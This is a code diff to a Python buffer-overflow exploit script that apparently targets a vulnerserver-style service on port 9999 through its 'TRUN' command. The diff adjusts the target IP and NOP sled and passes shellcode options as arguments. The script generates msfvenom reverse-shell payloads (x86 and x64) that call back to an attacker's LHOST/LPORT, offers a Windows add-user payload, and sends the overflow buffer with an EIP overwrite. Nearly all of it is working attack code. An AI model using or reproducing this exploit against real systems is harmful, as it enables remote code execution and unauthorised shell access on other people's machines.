@@ -6,12 +6,12 @@ from colorama import Fore, Back, Style, init
 import codecs
 
 init(autoreset=True) # Colorama auto reset settings
-IP = ('192.168.0.110').encode('latin-1')
+IP = ('192.168.1.108').encode('latin-1')
 CRASH = 3000 # Size of the total payload when EXE crashed
 PORT = 9999 # Remote Port where the EXE is listening
 EBP = 2003 # Total Size of the EBP
 EIP = "\xaf\x11\x50\x62" # EIP Size
-NOPS = 30 # Size of NOPS
+NOPS = 10 # Size of NOPS
 cmd = "TRUN /.:/" # Name oof the Vulnerable variable
 
 badcharlist = (
@@ -59,7 +59,7 @@ def sendPayload(buffer):
     try:
         print(Fore.RED + "Sending Payload ....")
         payload = cmd + buffer
-        print(payload)
+        print(bytes(payload,"latin-1"))
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((IP, PORT))
         s.send(bytes(payload,"latin-1"))
@@ -123,7 +123,7 @@ def remove_badchars(badchar):
 
     sendPayload(buffer)
 
-def shellcode():
+def shellcode(choice,LHOST=None,LPORT=None):
     if EIP == "":
         print("Please set the EIP Location.")
         print(Fore.RED + "Exiting...")
@@ -135,10 +135,13 @@ def shellcode():
     3. Windows User Add 
     4. Windows User Add x64
     ''')
-    choice = int(input(">> "))
+    
+    #choice = int(input(">> "))
+    
     if choice == 1 or choice == 2:
-        LHOST = input("Enter LHOST IP Address : ")
-        LPORT = input("Enter LPORT Number : ")
+        if LHOST == None or LPORT == None:
+            LHOST = input("Enter LHOST IP Address : ")
+            LPORT = input("Enter LPORT Number : ")
         print("Generating shellcode")
         with open('badchar.txt', 'r') as f:
             bd = f.read()
@@ -148,19 +151,20 @@ def shellcode():
             shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
             shellcode = shellcode.stdout.decode('latin-1')
             shellcode = shellcode.split("\n",1)[1]
-            shellcode = shellcode[:-2]
+            shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")])
             print("Shellcode : "+str(shellcode))
-            print("\n")
             buffer = "\x41" * EBP + EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
             sendPayload(buffer)
         if choice == 2:
             #print("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd))
             shellcode = subprocess.run(["msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
-            shellcode = shellcode.stdout.decode('latin-1')
+            shellcode = shellcode.stdout.decode('utf-8')
             shellcode = shellcode.split("\n",1)[1]
-            shellcode = shellcode[:-2]
-            print("Shellcode : "+str(shellcode))
-            buffer = "\x41" * EBP + EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
+            shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
+            import codecs
+            shellcode=codecs.decode(shellcode, 'unicode_escape')
+            #print("Shellcode : "+shellcode)
+            buffer = "\x41" * EBP + EIP + "\x90" * NOPS + shellcode + "\x43" * ( CRASH - EBP - 4 - NOPS)
             sendPayload(buffer)
     if choice == 3:
         # msfvenom -p windows/adduser -b "\x00\x04\xa4\xba\xef" -e x86/fnstenv_mov -f c
@@ -172,8 +176,8 @@ def shellcode():
         shellcode = shellcode.stdout.decode('latin-1')
         shellcode = shellcode.split("\n",1)[1]
         shellcode = shellcode[:-2]
-        print("Shellcode : "+str(shellcode))
-        buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
+       
+        buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + shellcode + "\x43" * ( CRASH - EBP - 4 - NOPS)
         sendPayload(buffer)
 
 if __name__ == '__main__':
@@ -207,7 +211,7 @@ if __name__ == '__main__':
             remove_badchars(args.br)
 
         if args.s:
-            shellcode()
+            shellcode(int(args.s),args.L,args.P)
             
 
 
